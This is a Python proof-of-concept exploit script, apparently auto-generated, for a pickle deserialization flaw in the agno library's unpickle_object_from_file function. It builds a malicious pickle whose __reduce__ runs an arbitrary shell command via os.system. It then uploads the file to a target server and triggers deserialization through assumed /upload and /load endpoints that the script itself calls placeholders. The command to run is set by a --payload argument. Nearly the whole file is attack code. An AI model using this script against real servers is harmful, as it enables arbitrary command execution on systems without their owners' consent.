#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-010
# Sink: unpickle_object_from_file
# Auto-generated — run with: python3 rce_function_unpickle_object_uses_unpickle_object_from_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno library pickle deserialization RCE.
Vulnerability: unpickle_object_from_file() uses pickle.load() on attacker-controlled file_path.
This allows arbitrary code execution via a crafted pickle file.

Usage:
    python3 exploit.py <target_url> [--payload <command>]

Example:
    python3 exploit.py http://victim:8000
    python3 exploit.py http://victim:8000 --payload "id > /tmp/pwned.txt"
"""

import argparse
import base64
import os
import pickle
import requests
import sys
import tempfile
import time

# ──────────────────────────────────────────────────────────────────────
# 1. Build a malicious pickle payload
#    We use __reduce__ to execute an arbitrary shell command.
#    By default, we use a benign command to prove RCE.
# ──────────────────────────────────────────────────────────────────────

class Exploit:
    """Class whose __reduce__ method returns (os.system, (command,))."""
    def __reduce__(self):
        return (os.system, (self.cmd,))

def build_pickle_payload(command: str) -> bytes:
    """
    Create a pickle payload that executes `command` via os.system().
    Returns the raw pickle bytes.
    """
    obj = Exploit()
    obj.cmd = command
    return pickle.dumps(obj)

# ──────────────────────────────────────────────────────────────────────
# 2. Upload the malicious pickle file to the target server
#    We assume the target has some endpoint that accepts file uploads
#    and stores them at a known path. If not, we can use a local file
#    path if the attacker has write access (e.g., /tmp/evil.pkl).
#    For this PoC, we simulate by writing the payload to a temp file
#    and then triggering the vulnerable function via a crafted request.
# ──────────────────────────────────────────────────────────────────────

def upload_pickle(target_url: str, payload_bytes: bytes) -> str:
    """
    Upload the pickle payload to the target server.
    Returns the path where the file is stored (or raises an exception).
    This is a placeholder — adapt to the actual upload mechanism.
    """
    # Example: POST to /upload with multipart form data
    files = {'file': ('evil.pkl', payload_bytes, 'application/octet-stream')}
    try:
        r = requests.post(f"{target_url}/upload", files=files, timeout=10)
        r.raise_for_status()
        # Assume response contains the file path (e.g., JSON {"path": "/tmp/evil.pkl"})
        file_path = r.json().get("path", "/tmp/evil.pkl")
        print(f"[+] Uploaded payload to {file_path}")
        return file_path
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        sys.exit(1)

# ──────────────────────────────────────────────────────────────────────
# 3. Trigger the vulnerable function
#    We need to call unpickle_object_from_file with the attacker-controlled
#    file_path. This could be via an API endpoint that accepts a file path
#    parameter and passes it to the vulnerable function.
# ──────────────────────────────────────────────────────────────────────

def trigger_rce(target_url: str, file_path: str):
    """
    Send a request that causes the server to call
    unpickle_object_from_file(file_path).
    """
    # Example: GET /load?path=/tmp/evil.pkl
    params = {'path': file_path}
    try:
        r = requests.get(f"{target_url}/load", params=params, timeout=10)
        print(f"[+] Trigger request sent (status {r.status_code})")
        # The command should have executed server-side
    except Exception as e:
        print(f"[-] Trigger failed: {e}")
        sys.exit(1)

# ──────────────────────────────────────────────────────────────────────
# 4. Main exploit logic
# ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="agno pickle RCE PoC")
    parser.add_argument("target_url", help="Base URL of the target (e.g., http://victim:8000)")
    parser.add_argument("--payload", default="touch /tmp/poc_success.txt",
                        help="Command to execute on the target (default: touch /tmp/poc_success.txt)")
    args = parser.parse_args()

    target_url = args.target_url.rstrip("/")
    command = args.payload

    print(f"[*] Target: {target_url}")
    print(f"[*] Payload command: {command}")

    # Step 1: Build the malicious pickle
    print("[*] Building pickle payload...")
    payload_bytes = build_pickle_payload(command)
    print(f"[+] Payload size: {len(payload_bytes)} bytes")

    # Step 2: Upload the payload to the server
    # If the server does not have an upload endpoint, you can write the file
    # directly if you have filesystem access (e.g., via another vulnerability).
    # For demonstration, we assume an upload endpoint exists.
    file_path = upload_pickle(target_url, payload_bytes)

    # Step 3: Trigger the deserialization
    print("[*] Triggering deserialization...")
    trigger_rce(target_url, file_path)

    # Step 4: Verify (optional) — check if the command executed
    # This depends on the command; for "touch /tmp/poc_success.txt", we could
    # try to access that file via another endpoint.
    print("[+] Exploit completed. Check target for evidence of RCE.")

if __name__ == "__main__":
    main()
